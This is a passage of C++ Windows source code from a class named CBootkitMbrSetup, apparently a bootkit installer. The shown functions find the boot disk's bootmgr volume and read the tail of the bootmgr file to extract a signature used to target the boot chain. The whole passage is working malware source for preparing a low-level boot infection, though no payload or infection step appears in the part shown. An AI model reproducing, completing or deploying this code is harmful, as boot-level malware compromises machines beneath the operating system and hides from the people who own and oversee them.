			hVol = CreateFile(volPath, FILE_READ_ACCESS, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			lastErr = GetLastError();

			// Get volume disk extents
			retVal = FALSE;
			if (hVol != INVALID_HANDLE_VALUE)  {
				retVal = DeviceIoControl(hVol, IOCTL_VOLUME_GET_VOLUME_DISK_EXTENTS, NULL, 0, (LPVOID)&vde, sizeof(vde), &bytesRead, NULL);
				lastErr = GetLastError();
				CloseHandle(hVol);
			}

			if (retVal) {
				dskIdx = vde.Extents[0].DiskNumber;
				if (dskIdx != g_dwSysBootDskIdx) isValid = FALSE;
			} else {
				g_pLog->WriteLine(L"CBootkitMbrSetup::GetBootmgrVolume - Unable to get disk extents for %s Volume, last error: %i",
					(LPVOID)volPath, (LPVOID)lastErr);
				// Check this:
				isValid = FALSE;
			}

			// If bootmgr is valid break search cycle
			if (isValid)
				break;

			// Set retVal to prevent search cycle to exit 
			retVal = TRUE;
		}
		
		retVal = FindNextVolume(hSearch, volPath, COUNTOF(volPath));
		drvType = GetDriveType(volPath);
		while (retVal && (drvType != DRIVE_FIXED)) {
			retVal = FindNextVolume(hSearch, volPath, COUNTOF(volPath));
			drvType = GetDriveType(volPath);
		}

		if (retVal) wcscat_s(volPath, COUNTOF(volPath), L"bootmgr");
		lastErr = GetLastError();	
	}

	if (hSearch && hSearch != INVALID_HANDLE_VALUE)
		FindVolumeClose(hSearch);

	// If I have not found any bootmgr volume, return error
	if (!isValid)
		return (DWORD)-1;

	// Delete '?' char (if needed)
	slashPtr = wcsstr(volPath, L"\\?");
	if (slashPtr) slashPtr[1] = L'.';
	// Delete "bootmgr" name from path
	volPath[volNameLen] = 0;
	// Eliminate trailing backslash (if needed)
	if (volPath[volNameLen-1] == '\\') 
		volPath[--volNameLen]  = 0;
	// ... then copy it
	if (volName && dwNameCCh) {
		volNameLen = (dwNameCCh > volNameLen) ? volNameLen : dwNameCCh - 1; 
		wcsncpy_s(volName, dwNameCCh, volPath, volNameLen);
	}

	slashPtr = wcsrchr(volPath, L'\\');
	if (!slashPtr) slashPtr = volPath;
	else slashPtr++;

	retVal = QueryDosDevice(slashPtr, volPath, COUNTOF(volPath));
	lastErr = GetLastError();
	// Search last number
	for (int i = wcslen(volPath) - 1; i > 0; i--) 
		if (volPath[i] < L'0' || volPath[i] > L'9') volPath[i] = 0;
		else break;

	for (int i = wcslen(volPath) - 1; i > 0; i--) 
		if (volPath[i] < L'0' || volPath[i] > L'9') {
			volNumber = _wtoi(&volPath[i+1]);
			break;
		}
	return volNumber;
}

// Get current system Bootmgr Signature
bool CBootkitMbrSetup::GetBootmgrSignature(LPBYTE lpStartByte, LPDWORD lpSignature)
{
	TCHAR volPath[0x100] = {0};					// Volume path string
	DWORD volNumber = 0;						// Volume number
	HANDLE hBootmgr = NULL;						// Bootmgr file handle
	DWORD retVal = 0;							// Win32 API returned value
	DWORD lastErr = 0;							// Last Win32 Error
	BYTE startByte = 0;							// Bootmgr signature start byte
	DWORD signature = 0;						// Bootmgr found signature
	DWORD bootmgrSize = 0;						// Bootmgr file size
	LPBYTE buff = NULL;							// Buffer 			
	DWORD buffSize = 0;							// Buffer size
	DWORD bytesRead = 0;						// Number of bootmgr bytes read

	// Get Bootmgr Volume name & number
	volNumber = GetBootmgrVolume(volPath, COUNTOF(volPath));
	
	// Add trailing slash to bootmgr volume string (if needed)
	retVal = wcslen(volPath);
	if (retVal && volPath[retVal-1] != L'\\') {
		volPath[retVal++] = L'\\';
		volPath[retVal] = 0;
	}
	wcscat_s(volPath, COUNTOF(volPath), L"bootmgr");
	hBootmgr = CreateFile(volPath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	lastErr = GetLastError();

	if (hBootmgr == INVALID_HANDLE_VALUE || retVal == (DWORD)-1) {
		// Bootmgr not found
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetBootmgrSignature - GetBootmgrVolume has failed! Last error: %i", (LPVOID)lastErr); 
		return false;
	} 

	// Now read last bootmgr file bytes
	buffSize = 4096;
	buff = (LPBYTE)VirtualAlloc(NULL, buffSize, MEM_COMMIT, PAGE_READWRITE);
	bootmgrSize = GetFileSize(hBootmgr, NULL);
	if (bootmgrSize)
		retVal = SetFilePointer(hBootmgr, -((LONG)buffSize), NULL, FILE_END);
	if (retVal) 
		retVal = ReadFile(hBootmgr, (LPVOID)buff, buffSize, &bytesRead, NULL);
	lastErr = GetLastError();
	
	// Close bootmgr file handle
	CloseHandle(hBootmgr);

	if (retVal && bootmgrSize) {
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetBootmgrSignature - Found Windows Bootmgr on \"%s\".", 
			volPath); 
	} else {
		// Bootmgr read error
		g_pLog->WriteLine(L"CBootkitMbrSetup - GetBootmgrSignature has failed to read Bootmgr on \"%s\". Last error: %i", 
			(LPVOID)volPath, (LPVOID)lastErr); 
		if (buff) VirtualFree(buff, 0, MEM_RELEASE);
		return false;
	}

	// Now search for the right signature
	int pos = buffSize - sizeof(DWORD) - 1;					// signature position in buffer
	while (pos) {
		if (buff[pos+1] && buff[pos+2] && buff[pos+3] && buff[pos+4]) 
				signature = *((LPDWORD)&buff[pos+1]);

		if (signature) { startByte = buff[pos];	break; }
		pos--;
		signature = 0; 
	}

	// Free up bootmgr buffer
	if (buff) VirtualFree(buff, 0, MEM_RELEASE);

	if (!signature) {
		// No signature found
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetBootmgrSignature - Failed to define Windows Bootmgr signature (on \"%s\").", 
			(LPVOID)volPath); 
		return false;
	} else 
		g_pLog->WriteLine(L"CBootkitMbrSetup::GetBootmgrSignature - Successfully obtained 0x%08X Bootmgr signature (0x%02X first byte) for current system...", 
			(LPVOID)signature, (LPVOID)startByte); 

	if (lpStartByte) *lpStartByte = startByte;
	if (lpSignature) *lpSignature = signature;

	return true;
}
#pragma endregion